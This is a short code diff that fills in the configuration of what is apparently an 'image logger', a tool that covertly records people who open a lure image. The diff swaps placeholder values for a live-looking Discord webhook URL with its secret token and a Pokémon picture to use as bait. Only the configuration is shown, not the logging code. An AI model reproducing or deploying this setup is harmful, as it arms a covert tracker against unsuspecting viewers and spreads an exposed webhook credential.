@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335359210728194128/qOptIDDu_W8Q0P6l3q8kkZUr32_SZ_0RgB-1urTJ8pcc06lir4zcYU4MSR9g-hI35Vrj",
+    "image": "https://db.pokemongohub.net/images/pokemon-home-renders/Shiny/poke_capture_0151_000_uk_n_00000000_f_r.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
